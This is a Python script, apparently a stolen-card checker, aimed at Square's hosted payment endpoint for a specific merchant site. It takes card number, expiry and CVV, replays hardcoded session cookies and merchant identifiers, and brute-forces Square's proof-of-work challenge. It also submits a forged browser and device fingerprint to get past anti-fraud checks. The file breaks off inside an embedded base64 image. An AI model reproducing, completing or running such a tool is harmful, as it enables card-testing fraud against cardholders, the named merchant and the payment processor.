import requests
import hashlib

import re
from bs4 import BeautifulSoup
def sq(ccx):
    try:
        n, mm, yy, cvc = ccx.strip().split("|")
    except ValueError:
        print("❌ Invalid format. Use: card|month|year|cvv")
        return

    # Convert exp_month safely
    try:
        exp_month = int(mm.lstrip("0")) if mm.lstrip("0") else 0
        if not 1 <= exp_month <= 12:
            print("❌ Invalid month.")
            return
    except ValueError:
        print("❌ Invalid month format.")
        return

    # Handle both 2-digit and 4-digit years
    try:
        if len(yy) == 2:
            exp_year = int("20" + yy)
        elif len(yy) == 4:
            exp_year = int(yy)
        else:
            print("❌ Invalid year format. Use 2 or 4 digits.")
            return
    except ValueError:
        print("❌ Year must be numeric.")
        return

    cookies = {
    '_savt': '3e691435-a4c5-449b-9b15-ca748ce065b7',
    '__cf_bm': 'mpY8giBlmiQB5B3ORTTHxy3di3F6MGqUhvKO6nD_zs8-1758716302-1.0.1.1-baE6a5P5ZzzaZIwfbFpD0SmQMHQewJpgkkvqOHc8UT6m12TwKwxrXmrm.VNGdlvsXrjYGzQRD46W.1Q81osqn_sHtjEuDrLt45N_JS7wzhk',
}

    headers = {
    'authority': 'pci-connect.squareup.com',
    'accept': 'application/json',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
    'content-type': 'application/json; charset=utf-8',
    # 'cookie': '_savt=3e691435-a4c5-449b-9b15-ca748ce065b7; __cf_bm=4yUPbnlhHS9PoJl195rHRWumefc2bKcCvP.dKgrULnA-1758478955-1.0.1.1-l3JA95kTELLfU98bbXlBIsULORWUW3M7F2b.YCTfandP.qYLO86b6Ddh6T8y5nmOTegKsp9JBKykoajzHE4k4Iw.e27nswyXZ8hl7UrkhwI',
    'origin': 'https://web.squarecdn.com',
    'referer': 'https://web.squarecdn.com/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

    params = {
    'applicationId': 'sq0idp-wGVapF8sNt9PLrdj5znuKA',
    'hostname': 'underthedivi.com',
    'locationId': '6JKR6RP4CBRJB',
    'version': '1.78.2',
}

    response = requests.get('https://pci-connect.squareup.com/payments/hydrate', params=params, cookies=cookies, headers=headers)


    data = response.json()

    instance_id = data.get("instanceId", "not found")
    session_id = data.get("sessionId", "not found")
    avt = data.get("avt", "not found")

    print("Instance ID:", instance_id)
    print("session id", session_id)
    print("payment", avt)


    LOCATION_ID = '6JKR6RP4CBRJB'
    APPLICATION_ID = 'sq0idp-wGVapF8sNt9PLrdj5znuKA'

    def pack5_calculate_Pow_Counter(powPrefix, sessionId, instanceId):
        session_id = sessionId
        install_id = instanceId

        base_string = f"xxxx:{{}}:{APPLICATION_ID},{LOCATION_ID},install_id"
        base_string = base_string.replace("xxxx", session_id)
        base_string = base_string.replace("install_id", install_id)

        target_prefix = powPrefix

        def find_matching_number(base_string, target_prefix, max_iterations=1000000):
            number = 0
            while number < max_iterations:
                test_string = base_string.format(number)
                hash_result = hashlib.sha256(test_string.encode()).hexdigest()
                if hash_result.startswith(target_prefix):
                    return number, hash_result
                number += 1
            raise ValueError("not find hash")

        try:
            matching_number, matching_hash = find_matching_number(base_string, target_prefix)
        except Exception as e:
            return None

        final_string = base_string.format(matching_number)
        return matching_number

    powPrefix = "000"
    sessionId = session_id
    instanceId = instance_id
    parm_pow_counter = pack5_calculate_Pow_Counter(powPrefix, sessionId, instanceId)
    print(parm_pow_counter)



    cookies = {
    '_savt': '3e691435-a4c5-449b-9b15-ca748ce065b7',
    '__cf_bm': 'mpY8giBlmiQB5B3ORTTHxy3di3F6MGqUhvKO6nD_zs8-1758716302-1.0.1.1-baE6a5P5ZzzaZIwfbFpD0SmQMHQewJpgkkvqOHc8UT6m12TwKwxrXmrm.VNGdlvsXrjYGzQRD46W.1Q81osqn_sHtjEuDrLt45N_JS7wzhk',
}


    headers = {
    'authority': 'pci-connect.squareup.com',
    'accept': 'application/json',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
    'content-type': 'application/json; charset=utf-8',
    # 'cookie': '_savt=3e691435-a4c5-449b-9b15-ca748ce065b7; __cf_bm=4yUPbnlhHS9PoJl195rHRWumefc2bKcCvP.dKgrULnA-1758478955-1.0.1.1-l3JA95kTELLfU98bbXlBIsULORWUW3M7F2b.YCTfandP.qYLO86b6Ddh6T8y5nmOTegKsp9JBKykoajzHE4k4Iw.e27nswyXZ8hl7UrkhwI',
    'origin': 'https://web.squarecdn.com',
    'referer': 'https://web.squarecdn.com/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

    params = {
    '_': '1758479056572.254',
    'version': '1.78.2',
}

    json_data = {
    'analytics': {
        'fingerprints': [
            {
                'components': '{"user_agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36","language":"en-IN","resolution":[873,393],"available_resolution":[873,393],"timezone_offset":-330,"open_database":1,"navigator_platform":"Linux armv81","regular_plugins":[],"adblock":false,"touch_support":[5,true,true],"js_fonts":["Arial","Courier","Courier New","Georgia","Helvetica","Monaco","Palatino","Tahoma","Times","Times New Roman","Verdana","Wingdings 2","Wingdings 3"]}',
                'fingerprint': '7b24e95eec0604628721e434cff1fc12',
                'version': 'fingerprint-v1',
            },
            {
                'components': '{"language":"en-IN","resolution":[873,393],"available_resolution":[873,393],"timezone_offset":-330,"open_database":1,"navigator_platform":"Linux armv81","regular_plugins":[],"adblock":false,"touch_support":[5,true,true],"js_fonts":["Arial","Courier","Courier New","Georgia","Helvetica","Monaco","Palatino","Tahoma","Times","Times New Roman","Verdana","Wingdings 2","Wingdings 3"]}',
                'fingerprint': '90718501aa878b7ff611c73ce4f51afa',
                'version': 'fingerprint-v1-sans-ua',
            },
            {
                'components': '{"fonts":["sans-serif-thin"],"dom_blockers":[],"font_preferences":{"default":164.71875,"apple":164.71875,"serif":164.71875,"sans":144.734375,"mono":132.625,"min":10.296875,"system":144.734375},"audio":124.08072766105033,"screen_frame":[0,0,0,0],"languages":[["en-IN"]],"device_memory":4,"screen_resolution":[873,393],"hardware_concurrency":8,"timezone":"Asia/Calcutta","indexed_db":true,"open_database":true,"platform":"Linux armv81","plugins":[],"canvas":{"winding":true,"geometry":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAHoAAABuCAYAAADoHgdpAAAAAXNSR0IArs4c6QAADRtJREFUeF7tnU+IJUcdx38988KIcQNCLjsguEmMHkSjbzfxIGQ2IV4yOQkeIrogMosXc4mIKO7OQUTIJetBEiRgDgqyFzGKKDqzByGb7OgeRCRkdz3o5Bp288dH5k3Lr7urX3W9+vP7VVV3FTP9YHm7+6qqq+vT39/vV7+q7i4g8ad8oNyAQ9iAEh5tu1LAhrZbJexW/1/Alep7BXaLN4vq/8qfvV7XWYENKIpFW9WPhvaKpr2qTFm3iZ9D2C2+daZq94Gy3DgE2Chh0b8C9O2VULdXQN2/FYDdN4u6f6k/xdAdqMDO4UIDTA/U1an5nbrE7K36+2N3AE41lR53Vbb/fhUAnm+K4N9herL+18kTAOsnvBrHC0DAv1kUF70aCaw0COgWrkmplJNAuAj2oIFsq/MYD7qAW4F1fQT46bqrpO33bfxxSOi9gg4GzIFrGlaEblA5C7Cu/UjQhwDeC+jyvvJi5XN9FBwDrg6KBBxNM0ImKZiqW4QeqPI+gUcFHaTgvgBLoF4FgJ8+BvBqoB+3sg9X+XYfwKOBLk+VO1kpWKHxtKxgizmnCthZLgx4dNjBoJvp0Y7zxNUCAygYD4kq/qqH/2afj6kCAveP2KMBDwJd+WJopkqckZntL6ZGnHrMsuiLL7nqDKFu7IO/D48C2xu0l6keCDCOa8dUu2DjHPybrkKRfvcAjvPwW0VxNqQHXqC9IL/3Bm0OHHI2TV0WZHG8Iw6bBdrLH6MvfveNCPjcTVj9sbt6XQKVLbJs1Dq+5TzUvQJw1ietygN9X1myzmlAU439up/VOUvhH8VqiNCOB+ybRcHihr0gV2Cb6wFNNdsnu8Z/SDOOfcEc+uaDrl61v/v4bBJoFuSBpk3yqHj5ZNewDg0b+4OwiQsnXNhO0Kwp1ID+WHAiTaFcUE2/DzX1ko/PgA0A5KmXFfSxhiwGf8jgTByT4bepwZkLNC34GjjoEuMRLfhyKX7I4MwDNiU4M4ImqzkR5F5Ntgo+hb9m+GyKv9aCJkNO4JPx/AeFnNKEM2C7TLgJtNtkJ4Icdb7sMtny76lUTYTtUvUSaLKab+9xhila2SRqFr1PEYXz5tnGKFwH2q3mgZMh8lUyWACmuzRTqpqQVLGpugOapOZEwVcy36wCTzHdYkTiJl+tgrarOSHkZL45lwhc9MORUDGpugVNUnMiv5yNmlNH4OL4W1NrzKNTNR10YjUnDcJyU7XDX+tULYM2m+3EkLMx2zLwFNky+fiONKmaLatAO812QpOdndnOxXxjPywmXDXfbtAZqDkrsy1Ap5xqEaJw1XzXoE17shNmv2Qr1ct6c2gKJwfQlqyZHrRpi1AGas7SP4uLJLWfdmTNZD9dGDf8ZQI5yoa/UPWa6qdMnsh9MsytZT9dGAOxTEBn6Z/FIKfKfasXnnm61ea+9aAzgZxtxJ1TQGbJmMl+utAGYhmBzjIQyxG0RtVu0InnzdlH3DmC1kTgXdBqxJ2RmrOOuHOKvEVfNKoWkTf66G7qMyM1j6A9pgtKtkwPOjM1j6A9QCtTraMLenIDYPVfAPD3epRm7wNM/ln//eCw/p6sNCP42fp79Uz9Pf8UwAFzD0sOSRP5elDMtx50ZmabpGgEu3a5AbYHMJsDzA8XUDmiWJsArK0CzKcAB59uLpQn7S3kBhp7K5nvZdAZmm0jaAF3VdqgiIBnBxys5rICuCgxO2eGniNoyXwvQIsFjUxBd+bROsCo3nc/iANYbUUFXrmCcwCzRuW5LGyo/W7Mt34enaHZxv5XoNd+BzD5B4Cs4GrQI6rYdKnoYAvg608O90gM7qW8NYVl0Id3NoZ6KgGrv5Mb8PTaZbiqAh4KsuisCfa3AeCL5wD2HH6cddKRCtfmW8l1z/YvtA9QjXSc4Gbu/kmlYO2ixhBKpphxBP0MAOxlCHsJND5t9/39nWxAox/+8PfaYV5apkwB2aTsXwLAI9IVkRPw9ROwsvlg+7yTeofJvdfcd2cES5TQAPritV8sFWxntikhi17dfRfAajMPv6E5p1xgr5+Am099st38WYM+c62EWwQQfRZpTLXuEG3kfXvWZw/obd+zVisZFa377E8BXvkuvb0eSmL3fnX+9AJ09eT6l4qdpKAtkHEMKtA5qFk24d9Zrf2z6ZMYdhU+HJZnxZsEivKF1y/CreIC/LyHy8rVpOKPTcUrP52LmkUnf7BmBy3KvfJjgH1mWtU1boTf9aChuADfJ9SOXeSer9BanM3h/lhZL9oR3aX+MAGYrrrLYYkXf00rF7FUHT6U28X5M9WrHWpFI2hU9JB+2mGuO+d8e8Z7tmfEAdM2hXvFvrYCsHkX7UgDm3Ex64MCdout09UzRIvyxWs71VtkEPJQ5psDGXt5e2Z/HDNtuOOVEpsCEfS6WAlzND8gbDto7OcQqjZMoYzDJAVh2ewfEwsZHNB4ggNNvdpZn1bR2JG+Vc2FjH2SQGexx1ve4otqpprvgYKzVs2VvZZN9wtKsqRPVVODL1ne733QWVtOrmp5WdIHdM/BmZrDKZq5dFGqoP8MAH+J587alnzUjJUV0Ek39Ksb9n1B9+SvO2puBt4Mug9f7Qu5CcTUyy6ZqnWbDLbW/FTRw/xal5G1g47tq31Mthg+TaIkia823X4znQDseexsWf8cwOZv/S4Sfa2lR0/h1FmaRxsWNGL56hA1a0y3OMdBVW2CLEz33twP9nQLYPrDGLC1kDE/Yle0OHSMbFmImi2g8afBEoumfWGyj/aBHUnV6mMs2iQYBt5tMCYSJrrrKtSEh6rZAXoQE267YxLNtpwG9YG9+TLAunhrqpe4O2qWIeszY6ZjhEThoWrGPjk2//Uahbtui1VBV0kRphkPU7UZ8tI82qZoAd/HX8dQMwE0FunFX1N2eJoibi5sD1Wrj67oKFlwM2bGbJaDCzsWaIf57iU4o0DGA9umVhzYTFWTIFcDo1u9orgHTnAWw2yLPhE3HUQLziib8nVmWx1DDuyt/1AIVGXk4Eur5LYlGTTuMFkpaC8RpQZnMdUsOk3YeBAlOKM+l4SaKKHCJppv+bkkdsiqojmgqT67D9BEVXv7bKq5xgNQ1CzrkwLbYb7p5lo6sLyVqOKu5rspRsTms7nrzZTjYRmCqr18NgeyyzebzsUF2wLaC7I0h64DcARNibx1J2CaesX0z/JxmfdZkaZerimUet5cNXOUrffT9imURSQiWRIOGltQYRM3/FFFvFSOYcKxrhU21R+LToRAFm3YlK34afV5nm6fLI/WIhBbgPbx0yoBAbwP/6weiwl7CTjXVPv4ZduVbILd5L51j2HmQa7sdLsxMC5ooe6/6u+28FawqaIP7FMAlx73eG1wDCWr56GBffrkZw7+9tTvn1BfG8yHDABSINaCrvj7BGQ6CF/6xnX4zTsPwaXoaJcbpMJGBeMfhOwy5zF9smsIGth4VwX+eebeT7xdfHn3ox0DLHbputpSfpf9cxe0b0CmdgBBf/ydh/gjyjwTUdwGW8A1vPjbGaxxN/8xT6GCuzeHR8R6tgLaS8lVH7pmuws6hp/GFrc0m/JxRPHTp8pl4A7AKo+l7vVhqqWDVoDlGzElM16c/289E/JUcn0YC+ho5lsHWh5ZMapX8YYqpgRMxcWtqzh6E+bqkWgT15ZPrsDzzbJjX92T77LtnE4DG0GHQV6sQcvtd1+HFMN8u0CrsHBEMXeJHwHedAHIo4R//4Jyf7LaNg4eft5qHju133zLm+4/39xWY9iI32f3lq7bCvbl7erOGe/Pspo7prtSdAzzzQXtfUJHtGLwfVoE0FHM9wg67AoMBK1G26Izy++mDDXfI+iEoPVqXjLdUcy3PL0KO+XjV/vfH7kOf3ypnpp6fExq1oKuYIeoegTtgaipEgTarGYz6JCgbATtD/pPD1+BW88+6teAB+ggVZ967go88ZpnZ/1O8cjU8gZth2xUdJCv/tBr1+Hrz3n7mSMDzedEXn72OvzvYY+xCwAdpOox8vbB7PmsEzdkq6KDVD36aT5o30BMWY40HXhpHq0W9Mq7jqD5oL38M03NTkWL3rLXqkc/PQho27xZ7YBT0ZUJ91kyG/00DzY79UlXM1nRXoHZaL7poNlmmweZBbpWNuMpwKP57g00x2SLTpBMd+uruRmzUdU02CyzzVczW9Fsfz2q2g2aZbb9IHuBZvvrUdV22FQ1S/c6u6+e5RIs0y1XJ69wjblvMxeGmn38snxgf9Acfz2qWg+bqmZi9sumdG/QlQmnwh599TIDqpojQPb20R0TToU9qnoxbFTImv3ZPv45CmhWJD5my2pOJJPtH2HrLoYg091RNiVNOppwAIqaI5nrKMGY7qoh+ezjHIUnghzNdLN99nH016715gJ2YV5ui9cX+fpiU71opls9gHOefZxgEyCLl5zEBiza6w00KUg7LsGZNfiKG3QNrmhxQOta9nEIzmwb/noIupKBJgE/imbcZq4D89Y+5v3/rApZyc0UUDYAAAAASUVORK5CYII=","text":"data:image/png;base64,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